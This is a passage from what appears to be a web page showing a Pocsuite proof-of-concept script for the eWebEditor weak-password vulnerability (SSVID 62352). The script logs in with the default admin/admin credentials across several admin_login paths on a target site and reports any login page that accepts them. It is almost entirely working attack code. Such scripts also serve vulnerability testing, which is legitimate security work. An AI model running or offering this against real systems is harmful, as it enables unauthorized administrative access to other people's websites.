port</span> req</span><br><span class="line"><span class="keyword">from</span> pocsuite.poc <span class="keyword">import</span> POCBase, Output</span><br><span class="line"><span class="keyword">from</span> pocsuite.utils <span class="keyword">import</span> register</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestPOC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;62352&#x27;</span>  <span class="comment"># ssvid</span></span><br><span class="line">    version = <span class="string">&#x27;1.0&#x27;</span></span><br><span class="line">    author = [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line">    vulDate = <span class="string">&#x27;2013-04-23&#x27;</span></span><br><span class="line">    createDate = <span class="string">&#x27;2016-03-07&#x27;</span></span><br><span class="line">    updateDate = <span class="string">&#x27;2016-03-07&#x27;</span></span><br><span class="line">    references = [<span class="string">&#x27;http://www.seebug.org/vuldb/ssvid-62352&#x27;</span>]</span><br><span class="line">    name = <span class="string">&#x27;eWebEditor 弱密码漏洞&#x27;</span></span><br><span class="line">    appPowerLink = <span class="string">&#x27;http://www.ewebeditor.net/&#x27;</span></span><br><span class="line">    appName = <span class="string">&#x27;eWebEditor&#x27;</span></span><br><span class="line">    appVersion = <span class="string">&#x27;ALL&#x27;</span></span><br><span class="line">    vulType = <span class="string">&#x27;Weak Password&#x27;</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ewebeditor默认情况下， 可用弱口令登录，从而导致攻击者可据此信息进行后续攻击。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    samples = [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._verify()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        paths = [<span class="string">&quot;/admin_login.asp&quot;</span>, <span class="string">&quot;/admin/ewebeditor/admin_login.asp&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;/edit/admin_login.asp&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;/ewebeditor/admin_login.asp&quot;</span>, <span class="string">&quot;/admin/login.php&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">            target = <span class="string">&quot;%s%s?action=login&amp;usr=admin&amp;pwd=admin&quot;</span> % (<span class="variable language_">self</span>.url, path)</span><br><span class="line">            res = req.get(target)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;admin_default.asp&quot;</span> <span class="keyword">in</span> res.url <span class="keyword">and</span> <span class="string">&quot;href=&#x27;admin_login.asp&#x27;&quot;</span> <span class="keyword">in</span> res.content <span class="keyword">and</span> <span class="string">&quot;eWebEditor&quot;</span> <span class="keyword">in</span> res.content:</span><br><span class="line">                result[<span class="string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;</span><br><span class="line">                result[<span class="string">&#x27;VerifyInfo&#x27;</span>][<span class="string">&#x27;URL&#x27;</span>] = res.url</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        <span class="comment"># parse output</span></span><br><span class="line">        output = Output(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;Internet nothing returned&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register(TestPOC)</span><br></pre></td></tr></table></figure>
